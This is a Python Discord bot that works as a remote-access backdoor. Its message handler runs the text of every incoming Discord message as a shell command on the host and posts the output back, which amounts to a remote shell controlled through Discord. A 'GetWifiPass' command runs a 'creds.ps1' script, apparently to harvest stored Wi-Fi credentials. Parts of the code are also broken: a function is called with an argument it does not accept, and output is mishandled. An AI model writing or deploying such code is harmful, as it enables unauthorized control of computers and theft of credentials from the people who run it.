from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
import time
import subprocess
import settings

# inspect = subprocess.check_output("netsh wlan show interfaces", shell=True)
# await message.channel.send(inspect.decode('utf-8'))

def script():
    command = './creds.ps1'
    pscript = subprocess.Popen([command], shell=True)
    return pscript

def Exec(cmd):
    commands = subprocess.check_output(cmd, shell=True)
    return commands
def PsExec(powershell):
    pscommands = subprocess.check_output(powershell, shell=True)

intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True

bot = Bot("!", intents=intents)

@bot.command()
async def SendCMD(ctx, arg):
    await ctx.send(arg)
    
@bot.command()    
async def GetWifiPass(ctx):
    await ctx.send(script(ctx.content).decode("utf-8"))

@bot.event
async def on_message(message):
    await message.channel.send(Exec(message.content).decode("utf-8"))
    time.sleep(2)
    

if __name__ == "__main__":
    bot.run(settings.DISCORD_TOKEN)

